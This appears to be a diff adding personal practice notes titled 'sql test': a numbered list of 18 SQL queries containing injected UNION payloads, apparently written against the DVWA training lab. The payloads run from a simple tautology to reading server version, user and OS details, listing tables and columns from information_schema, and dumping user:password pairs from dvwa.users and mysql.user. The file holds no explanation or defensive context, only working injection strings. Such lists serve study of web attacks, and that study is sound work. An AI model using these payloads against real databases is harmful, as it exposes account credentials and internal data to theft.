@@ -1,0 +1,31 @@
+sql test:
+1. SELECT * FROM users WHERE first_name = '' OR 1 = '1' 
+2.SELECT
+    *
+FROM
+    users
+WHERE
+    first_name = ''union select 1,1, table_schema from information_schema.tables union select ' 1 '
+3. SELECT first_name, last_name FROM users WHERE first_name = '' UNION Select NULL, @@version # 
+4. SELECT price, event_description FROM products WHERE products.id_event = '' UNION SELECT NULL , @@version #
+5. SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = '' UNION SELECT NULL , @@version #
+6. SELECT price FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = '' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE() #
+7. SELECT price FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE() # 
+8. SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select database(), null #
+9. SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select NULL, user() # 
+10.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select NULL, @@server_id # 
+11.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select NULL, @@version_compile_os # 
+12.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select NULL, @@version_compile_machine # 
+13.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select NULL, @@version_compile_os # 
+14.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION Select database(), null # 
+15.SELECT event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = database() # 
+16.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION SELECT concat(table_schema,'.',table_name), column_name FROM information_schema.columns WHERE table_name ='users' # 
+17.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION SELECT concat(user,':',password), null FROM dvwa.users # 
+18.SELECT price, event_description FROM products JOIN categories ON products.category_id = categories.id WHERE products.id_event = 'test' UNION SELECT concat(user, ':',password), null FROM mysql.user # 
+19.
+
+
+
+
+
+ 
